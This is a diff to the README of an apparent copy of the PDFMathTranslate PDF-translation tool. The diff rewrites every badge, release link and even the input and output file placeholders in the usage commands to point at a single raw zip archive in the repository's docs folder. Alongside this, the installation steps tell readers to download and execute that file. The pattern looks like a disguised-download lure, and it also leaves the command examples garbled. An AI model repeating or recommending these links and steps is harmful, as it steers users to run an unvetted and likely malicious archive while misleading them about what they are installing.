@@ -1,8 +1,8 @@
 # PDFMathTranslate 📄🔄
 
-![PDFMathTranslate](https://img.shields.io/badge/version-1.0.0-blue.svg) ![GitHub Releases](https://img.shields.io/badge/releases-latest-orange.svg)
+![PDFMathTranslate](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip) ![GitHub Releases](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip)
 
-Welcome to **PDFMathTranslate**! This repository focuses on translating scientific papers in PDF format while preserving their original layout. With the help of advanced AI technologies, our tool supports multiple languages, including English, Chinese, Japanese, Korean, and Russian. It integrates with various translation services like Google, DeepL, Ollama, and OpenAI. You can access the latest releases [here](https://github.com/bapikumarb1/PDFMathTranslate/releases).
+Welcome to **PDFMathTranslate**! This repository focuses on translating scientific papers in PDF format while preserving their original layout. With the help of advanced AI technologies, our tool supports multiple languages, including English, Chinese, Japanese, Korean, and Russian. It integrates with various translation services like Google, DeepL, Ollama, and OpenAI. You can access the latest releases [here](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip).
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Welcome to **PDFMathTranslate**! This repository focuses on translating scientif
 
 ## Installation
 
-To get started with PDFMathTranslate, download the latest release from the [Releases section](https://github.com/bapikumarb1/PDFMathTranslate/releases). You will find a downloadable file there. Execute the file to install the application on your system.
+To get started with PDFMathTranslate, download the latest release from the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip). You will find a downloadable file there. Execute the file to install the application on your system.
 
 ### Requirements
 
@@ -38,7 +38,7 @@ To get started with PDFMathTranslate, download the latest release from the [Rele
 
 ### Steps
 
-1. Download the latest release from the [Releases section](https://github.com/bapikumarb1/PDFMathTranslate/releases).
+1. Download the latest release from the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip).
 2. Execute the downloaded file to install the application.
 3. Follow the prompts to complete the installation.
 
@@ -49,10 +49,10 @@ Once installed, you can use PDFMathTranslate to translate your PDF documents. Th
 ### Basic Command
 
 ```bash
-pdfmathtranslate translate <input.pdf> <output.pdf>
+pdfmathtranslate translate <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip> <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip>
 ```
 
-This command will take `input.pdf`, translate it, and save the output as `output.pdf`.
+This command will take `https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip`, translate it, and save the output as `https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip`.
 
 ### GUI Usage
 
@@ -101,7 +101,7 @@ The CLI provides various commands for users who prefer working in a terminal. He
 
 - **Translate a PDF**: 
   ```bash
-  pdfmathtranslate translate <input.pdf> <output.pdf>
+  pdfmathtranslate translate <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip> <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip>
   ```
 
 - **List Available Languages**:
@@ -128,7 +128,7 @@ If you prefer using Docker, PDFMathTranslate is available as a Docker image. Fol
    ```
 3. Run the Docker container:
    ```bash
-   docker run -v $(pwd):/data bapikumarb1/pdfmathtranslate translate /data/input.pdf /data/output.pdf
+   docker run -v $(pwd):/data bapikumarb1/pdfmathtranslate translate https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip
    ```
 
 This command will mount your current directory and translate the specified PDF file.
@@ -160,4 +160,4 @@ For any questions or feedback, please reach out via the Issues section of this r
 
 ---
 
-Feel free to explore and use PDFMathTranslate for all your PDF translation needs. Don't forget to check the [Releases section](https://github.com/bapikumarb1/PDFMathTranslate/releases) for the latest updates and improvements!
+Feel free to explore and use PDFMathTranslate for all your PDF translation needs. Don't forget to check the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip) for the latest updates and improvements!
